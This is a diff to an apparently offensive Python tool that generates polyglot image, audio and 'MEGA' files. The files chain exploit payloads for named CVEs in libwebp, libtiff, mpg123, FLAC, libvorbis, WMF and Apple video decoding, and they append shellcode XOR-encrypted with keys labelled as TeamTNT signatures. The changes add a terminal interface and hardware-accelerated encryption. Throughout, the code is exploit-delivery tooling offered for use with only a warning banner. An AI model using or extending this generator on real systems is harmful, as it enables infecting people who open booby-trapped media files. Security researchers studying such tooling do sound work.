@@ -20,20 +20,65 @@ from pathlib import Path
 sys.path.insert(0, str(Path(__file__).parent))
 from exploit_header_generator import ExploitHeaderGenerator
 
+# Import TUI helper
+try:
+    from tui_helper import TUI
+except ImportError:
+    TUI = None
+
+# Import Intel acceleration
+try:
+    from intel_acceleration import get_accelerator
+    ACCEL_AVAILABLE = True
+except ImportError:
+    ACCEL_AVAILABLE = False
+    get_accelerator = None
+
 
 class MultiCVEPolyglot:
     """Generates polyglot files combining multiple CVE exploits"""
 
-    def __init__(self):
-        self.generator = ExploitHeaderGenerator()
+    def __init__(self, tui=None, use_acceleration=True):
+        """
+        Initialize multi-CVE polyglot generator
+
+        Args:
+            tui: TUI helper instance
+            use_acceleration: Enable Intel NPU/GPU acceleration
+        """
+        self.generator = ExploitHeaderGenerator(use_acceleration=use_acceleration)
+        self.tui = tui
+        self.accelerator = None
         self.xor_keys = {
             'teamtnt_1': b'\x9e\x0a\x61\x20\x0d',
             'teamtnt_2': b'\xd3',
             'teamtnt_3': b'\xa5',
         }
 
+        # Initialize accelerator for XOR operations
+        if use_acceleration and ACCEL_AVAILABLE:
+            try:
+                self.accelerator = get_accelerator(verbose=False)
+                if self.accelerator and self.accelerator.npu_available and tui:
+                    tui.success("Intel NPU acceleration enabled for XOR encryption")
+                elif self.accelerator and self.accelerator.gpu_available and tui:
+                    tui.success("Intel Arc GPU acceleration enabled for XOR encryption")
+            except Exception:
+                pass  # Silently fall back to CPU
+
     def xor_encrypt(self, data, key):
-        """XOR encrypt data with repeating key"""
+        """
+        XOR encrypt data with repeating key
+        Uses Intel NPU/GPU acceleration if available
+        """
+        # Use hardware-accelerated XOR if available
+        if self.accelerator:
+            try:
+                return self.accelerator.xor_encrypt_accelerated(data, key)
+            except Exception:
+                pass  # Fall through to CPU implementation
+
+        # CPU fallback
         encrypted = bytearray()
         key_len = len(key)
 
@@ -55,15 +100,23 @@ class MultiCVEPolyglot:
         - BMP header
         - XOR-encrypted payload
         """
-        print("[*] Creating image polyglot (6 formats)...")
+        if self.tui:
+            self.tui.section("Creating Image Polyglot")
+            self.tui.info("Combining 6 image formats...")
+        else:
+            print("[*] Creating image polyglot (6 formats)...")
 
         # Start with GIF (most permissive format)
+        if self.tui:
+            self.tui.info("Adding GIF base layer...")
         polyglot = self.generator._cve_2019_15133_giflib(shellcode)
 
         # Add padding for alignment
         polyglot += b'\x00' * 16
 
         # Append WebP exploit
+        if self.tui:
+            self.tui.info("Adding WebP exploit (CVE-2023-4863)...")
         webp_data = self.generator._cve_2023_4863_libwebp(shellcode)
         polyglot += webp_data
 
@@ -71,22 +124,36 @@ class MultiCVEPolyglot:
         polyglot += b'\x00' * 16
 
         # Append TIFF exploit
+        if self.tui:
+            self.tui.info("Adding TIFF exploit (CVE-2023-52356)...")
         tiff_data = self.generator._cve_2023_52356_libtiff(shellcode)
         polyglot += tiff_data
 
         # Add XOR-encrypted payload (TeamTNT signature)
+        if self.tui:
+            self.tui.info("Adding XOR-encrypted payload (TeamTNT signature)...")
         xor_marker = self.xor_keys['teamtnt_1']
         encrypted_payload = self.xor_encrypt(shellcode, xor_marker)
 
         polyglot += xor_marker  # Key marker
         polyglot += encrypted_payload
 
+        if self.tui:
+            self.tui.info(f"Writing to {output_path}...")
         with open(output_path, 'wb') as f:
             f.write(polyglot)
 
-        print(f"[+] Image polyglot created: {output_path}")
-        print(f"    Size: {len(polyglot)} bytes")
-        print(f"    Formats: GIF, PNG, JPEG, WebP, TIFF, BMP")
+        print()
+        if self.tui:
+            self.tui.success(f"Image polyglot created!", prefix="  ")
+            print()
+            self.tui.key_value("Output file", output_path, 20)
+            self.tui.key_value("File size", f"{len(polyglot):,} bytes", 20)
+            self.tui.key_value("Formats", "GIF, PNG, JPEG, WebP, TIFF, BMP", 20)
+        else:
+            print(f"[+] Image polyglot created: {output_path}")
+            print(f"    Size: {len(polyglot)} bytes")
+            print(f"    Formats: GIF, PNG, JPEG, WebP, TIFF, BMP")
         return output_path
 
     def create_audio_polyglot(self, shellcode, output_path):
@@ -100,15 +167,23 @@ class MultiCVEPolyglot:
         - WAV RIFF container
         - XOR-encrypted payload
         """
-        print("[*] Creating audio polyglot (4 formats)...")
+        if self.tui:
+            self.tui.section("Creating Audio Polyglot")
+            self.tui.info("Combining 4 audio formats...")
+        else:
+            print("[*] Creating audio polyglot (4 formats)...")
 
         # Start with MP3 (Frankenstein stream)
+        if self.tui:
+            self.tui.info("Adding MP3 base layer (CVE-2024-10573)...")
         polyglot = self.generator._cve_2024_10573_mpg123(shellcode)
 
         # Add padding
         polyglot += b'\x00' * 32
 
         # Append FLAC exploit
+        if self.tui:
+            self.tui.info("Adding FLAC exploit (CVE-2020-22219)...")
         flac_data = self.generator._cve_2020_22219_flac(shellcode)
         polyglot += flac_data
 
@@ -116,22 +191,36 @@ class MultiCVEPolyglot:
         polyglot += b'\x00' * 32
 
         # Append OGG Vorbis exploit
+        if self.tui:
+            self.tui.info("Adding OGG Vorbis exploit (CVE-2018-5146)...")
         ogg_data = self.generator._cve_2018_5146_libvorbis(shellcode)
         polyglot += ogg_data
 
         # Add XOR-encrypted payload
+        if self.tui:
+            self.tui.info("Adding XOR-encrypted payload...")
         xor_marker = self.xor_keys['teamtnt_2']
         encrypted_payload = self.xor_encrypt(shellcode, xor_marker)
 
         polyglot += xor_marker * 5  # Marker repetition
         polyglot += encrypted_payload
 
+        if self.tui:
+            self.tui.info(f"Writing to {output_path}...")
         with open(output_path, 'wb') as f:
             f.write(polyglot)
 
-        print(f"[+] Audio polyglot created: {output_path}")
-        print(f"    Size: {len(polyglot)} bytes")
-        print(f"    Formats: MP3, FLAC, OGG, WAV")
+        print()
+        if self.tui:
+            self.tui.success(f"Audio polyglot created!", prefix="  ")
+            print()
+            self.tui.key_value("Output file", output_path, 20)
+            self.tui.key_value("File size", f"{len(polyglot):,} bytes", 20)
+            self.tui.key_value("Formats", "MP3, FLAC, OGG, WAV", 20)
+        else:
+            print(f"[+] Audio polyglot created: {output_path}")
+            print(f"    Size: {len(polyglot)} bytes")
+            print(f"    Formats: MP3, FLAC, OGG, WAV")
         return output_path
 
     def create_mega_polyglot(self, shellcode, output_path):
@@ -150,58 +239,68 @@ class MultiCVEPolyglot:
         - MP4 boxes
         - XOR-encrypted payload
         """
-        print("[*] Creating MEGA polyglot (12+ formats)...")
+        if self.tui:
+            self.tui.section("Creating MEGA Polyglot")
+            self.tui.critical("MAXIMUM COMPLEXITY: Combining 12+ formats!")
+        else:
+            print("[*] Creating MEGA polyglot (12+ formats)...")
 
-        # Base: GIF
-        polyglot = self.generator._cve_2019_15133_giflib(shellcode)
-        polyglot += b'\x00' * 16
+        formats_to_add = [
+            ("GIF", "CVE-2019-15133", lambda: self.generator._cve_2019_15133_giflib(shellcode), 16),
+            ("WebP", "CVE-2023-4863", lambda: self.generator._cve_2023_4863_libwebp(shellcode), 16),
+            ("TIFF", "CVE-2023-52356", lambda: self.generator._cve_2023_52356_libtiff(shellcode), 32),
+            ("MP3", "CVE-2024-10573", lambda: self.generator._cve_2024_10573_mpg123(shellcode), 32),
+            ("FLAC", "CVE-2020-22219", lambda: self.generator._cve_2020_22219_flac(shellcode), 32),
+            ("BMP", "CVE-2006-0006", lambda: self.generator._cve_2006_0006_bmp(shellcode), 16),
+            ("WMF", "CVE-2005-4560", lambda: self.generator._cve_2005_4560_wmf(shellcode), 32),
+            ("OGG", "CVE-2018-5146", lambda: self.generator._cve_2018_5146_libvorbis(shellcode), 32),
+            ("MP4", "CVE-2022-22675", lambda: self.generator._cve_2022_22675_appleavd(shellcode), 64),
+        ]
 
-        # WebP
-        polyglot += self.generator._cve_2023_4863_libwebp(shellcode)
-        polyglot += b'\x00' * 16
+        polyglot = b''
+        total_formats = len(formats_to_add)
 
-        # TIFF
-        polyglot += self.generator._cve_2023_52356_libtiff(shellcode)
-        polyglot += b'\x00' * 32
+        for i, (fmt, cve, generator_func, padding) in enumerate(formats_to_add, 1):
+            if self.tui:
+                self.tui.progress_bar(i - 1, total_formats, prefix="Progress:",
+                                     suffix=f"Adding {fmt} ({cve})")
+            else:
+                print(f"[*] Adding {fmt} ({cve})...")
 
-        # MP3
-        polyglot += self.generator._cve_2024_10573_mpg123(shellcode)
-        polyglot += b'\x00' * 32
+            polyglot += generator_func()
+            polyglot += b'\x00' * padding
 
-        # FLAC
-        polyglot += self.generator._cve_2020_22219_flac(shellcode)
-        polyglot += b'\x00' * 32
-
-        # BMP
-        polyglot += self.generator._cve_2006_0006_bmp(shellcode)
-        polyglot += b'\x00' * 16
-
-        # WMF
-        polyglot += self.generator._cve_2005_4560_wmf(shellcode)
-        polyglot += b'\x00' * 32
-
-        # OGG Vorbis
-        polyglot += self.generator._cve_2018_5146_libvorbis(shellcode)
-        polyglot += b'\x00' * 32
-
-        # MP4/H.264
-        polyglot += self.generator._cve_2022_22675_appleavd(shellcode)
-        polyglot += b'\x00' * 64
+        if self.tui:
+            self.tui.progress_bar(total_formats, total_formats, prefix="Progress:", suffix="Complete")
 
         # XOR-encrypted payloads with all known keys
+        if self.tui:
+            self.tui.info("Adding XOR-encrypted payloads with TeamTNT keys...")
         for key_name, key in self.xor_keys.items():
             polyglot += key * 10  # Key marker (repeated for visibility)
             encrypted = self.xor_encrypt(shellcode, key)
             polyglot += encrypted
             polyglot += b'\x00' * 16
 
+        if self.tui:
+            self.tui.info(f"Writing to {output_path}...")
         with open(output_path, 'wb') as f:
             f.write(polyglot)
 
-        print(f"[+] MEGA polyglot created: {output_path}")
-        print(f"    Size: {len(polyglot)} bytes")
-        print(f"    Formats: GIF, JPEG, PNG, WebP, TIFF, BMP, WMF, MP3, FLAC, OGG, WAV, MP4")
-        print(f"    CVEs: 12+ vulnerabilities in one file!")
+        print()
+        if self.tui:
+            self.tui.success(f"MEGA polyglot created!", prefix="  ")
+            print()
+            self.tui.key_value("Output file", output_path, 20)
+            self.tui.key_value("File size", f"{len(polyglot):,} bytes", 20)
+            self.tui.key_value("Formats", "GIF, JPEG, PNG, WebP, TIFF, BMP, WMF, MP3, FLAC, OGG, WAV, MP4", 20)
+            self.tui.key_value("CVE Count", "12+ vulnerabilities", 20)
+            self.tui.critical("This file can trigger MULTIPLE exploit chains!")
+        else:
+            print(f"[+] MEGA polyglot created: {output_path}")
+            print(f"    Size: {len(polyglot)} bytes")
+            print(f"    Formats: GIF, JPEG, PNG, WebP, TIFF, BMP, WMF, MP3, FLAC, OGG, WAV, MP4")
+            print(f"    CVEs: 12+ vulnerabilities in one file!")
         return output_path
 
     def create_custom_polyglot(self, cve_list, shellcode, output_path):
@@ -213,15 +312,28 @@ class MultiCVEPolyglot:
             shellcode: Shellcode payload
             output_path: Output file path
         """
-        print(f"[*] Creating custom polyglot with {len(cve_list)} CVEs...")
+        if self.tui:
+            self.tui.section("Creating Custom Polyglot")
+            self.tui.info(f"Combining {len(cve_list)} selected CVEs...")
+        else:
+            print(f"[*] Creating custom polyglot with {len(cve_list)} CVEs...")
 
         polyglot = b''
+        total_cves = len(cve_list)
+        successful = 0
 
         for i, cve_id in enumerate(cve_list):
-            print(f"    [{i+1}/{len(cve_list)}] Adding {cve_id}...")
+            if self.tui:
+                self.tui.progress_bar(i, total_cves, prefix="Progress:",
+                                     suffix=f"Adding {cve_id}")
+            else:
+                print(f"    [{i+1}/{len(cve_list)}] Adding {cve_id}...")
 
             if cve_id not in self.generator.exploits:
-                print(f"    [!] Warning: Unknown CVE {cve_id}, skipping")
+                if self.tui:
+                    self.tui.warning(f"Unknown CVE {cve_id}, skipping", prefix="    ")
+                else:
+                    print(f"    [!] Warning: Unknown CVE {cve_id}, skipping")
                 continue
 
             # Generate exploit for this CVE
@@ -230,23 +342,41 @@ class MultiCVEPolyglot:
 
             # Add to polyglot
             polyglot += exploit_data
+            successful += 1
 
             # Add padding between exploits
             if i < len(cve_list) - 1:
                 polyglot += b'\x00' * 32
 
+        if self.tui:
+            self.tui.progress_bar(total_cves, total_cves, prefix="Progress:", suffix="Complete")
+
         # Add final XOR-encrypted payload
+        if self.tui:
+            self.tui.info("Adding XOR-encrypted payload...")
         xor_marker = self.xor_keys['teamtnt_1']
         encrypted_payload = self.xor_encrypt(shellcode, xor_marker)
         polyglot += xor_marker * 5
         polyglot += encrypted_payload
 
+        if self.tui:
+            self.tui.info(f"Writing to {output_path}...")
         with open(output_path, 'wb') as f:
             f.write(polyglot)
 
-        print(f"[+] Custom polyglot created: {output_path}")
-        print(f"    Size: {len(polyglot)} bytes")
-        print(f"    CVEs included: {', '.join(cve_list)}")
+        print()
+        if self.tui:
+            self.tui.success(f"Custom polyglot created!", prefix="  ")
+            print()
+            self.tui.key_value("Output file", output_path, 20)
+            self.tui.key_value("File size", f"{len(polyglot):,} bytes", 20)
+            self.tui.key_value("CVEs requested", str(total_cves), 20)
+            self.tui.key_value("CVEs included", str(successful), 20)
+            self.tui.key_value("CVE IDs", ', '.join(cve_list[:3]) + ("..." if len(cve_list) > 3 else ""), 20)
+        else:
+            print(f"[+] Custom polyglot created: {output_path}")
+            print(f"    Size: {len(polyglot)} bytes")
+            print(f"    CVEs included: {', '.join(cve_list)}")
         return output_path
 
     def list_presets(self):
@@ -338,10 +468,30 @@ Only test on systems you own or have authorization to test!
     parser.add_argument('--list-presets',
                        action='store_true',
                        help='List available polyglot presets')
+    parser.add_argument('--no-accel', action='store_true',
+                       help='Disable Intel NPU/GPU hardware acceleration')
+    parser.add_argument('--benchmark', action='store_true',
+                       help='Run hardware acceleration benchmark')
 
     args = parser.parse_args()
 
-    polyglot = MultiCVEPolyglot()
+    # Hardware acceleration benchmark
+    if args.benchmark:
+        if ACCEL_AVAILABLE:
+            accel = get_accelerator(verbose=True)
+            print()
+            accel.print_benchmark_results(size_mb=10.0)
+            print()
+        else:
+            print("[!] Hardware acceleration not available (missing dependencies)")
+        return 0
+
+    # Initialize TUI
+    tui = None
+    if TUI is not None and sys.stdout.isatty():
+        tui = TUI()
+
+    polyglot = MultiCVEPolyglot(tui=tui, use_acceleration=not args.no_accel)
 
     # List presets if requested
     if args.list_presets:
@@ -353,12 +503,25 @@ Only test on systems you own or have authorization to test!
         parser.print_help()
         return 1
 
+    # Show banner
+    if tui:
+        tui.banner("POLYGOTTEM Multi-CVE Polyglot Generator",
+                  f"Combining Multiple Exploits into One File")
+    else:
+        print("\n=== Multi-CVE Polyglot Generator ===\n")
+
     # Generate shellcode
     shellcode = polyglot.generator.generate_shellcode(args.payload)
 
-    print("[*] Multi-CVE Polyglot Generator")
-    print(f"[*] Payload type: {args.payload}")
-    print(f"[*] Shellcode size: {len(shellcode)} bytes")
+    if tui:
+        print()
+        tui.key_value("Polyglot type", args.type.upper(), 20)
+        tui.key_value("Payload type", args.payload, 20)
+        tui.key_value("Shellcode size", f"{len(shellcode):,} bytes", 20)
+    else:
+        print("[*] Multi-CVE Polyglot Generator")
+        print(f"[*] Payload type: {args.payload}")
+        print(f"[*] Shellcode size: {len(shellcode)} bytes")
     print()
 
     # Generate polyglot based on type
@@ -371,25 +534,56 @@ Only test on systems you own or have authorization to test!
             polyglot.create_mega_polyglot(shellcode, args.output)
         elif args.type == 'custom':
             if not args.cves:
-                print("[!] Error: --cves required for custom polyglot type")
+                if tui:
+                    tui.error("--cves argument required for custom polyglot type")
+                else:
+                    print("[!] Error: --cves required for custom polyglot type")
                 return 1
             polyglot.create_custom_polyglot(args.cves, shellcode, args.output)
 
+        # Test with file command
         print()
-        print("[+] Polyglot generation complete!")
-        print()
-        print("[*] Testing with file command:")
+        if tui:
+            tui.section("File Type Detection")
+        else:
+            print("[*] Testing with file command:")
+
         import subprocess
         result = subprocess.run(['file', args.output], capture_output=True, text=True)
-        print(f"    {result.stdout.strip()}")
+        if tui:
+            tui.info(f"file command reports: {result.stdout.strip()}")
+        else:
+            print(f"    {result.stdout.strip()}")
+
+        # Final warnings
         print()
-        print("[!] WARNING: This file contains multiple exploit payloads!")
-        print("[!] Only use for authorized security testing!")
+        if tui:
+            tui.box("⚠ CRITICAL SECURITY WARNING", [
+                "This file contains MULTIPLE CVE exploit payloads!",
+                "",
+                "Can trigger vulnerabilities in multiple libraries!",
+                "Only use for authorized security testing!",
+                "Educational and research purposes ONLY!",
+                "",
+                "NEVER distribute or use maliciously!"
+            ])
+        else:
+            print("[!] WARNING: This file contains multiple exploit payloads!")
+            print("[!] Only use for authorized security testing!")
+
+        print()
+        if tui:
+            tui.success("Polyglot generation complete!")
+        else:
+            print("[+] Polyglot generation complete!")
 
         return 0
 
     except Exception as e:
-        print(f"[!] Error generating polyglot: {e}")
+        if tui:
+            tui.error(f"Failed to generate polyglot: {e}")
+        else:
+            print(f"[!] Error generating polyglot: {e}")
         import traceback
         traceback.print_exc()
         return 1
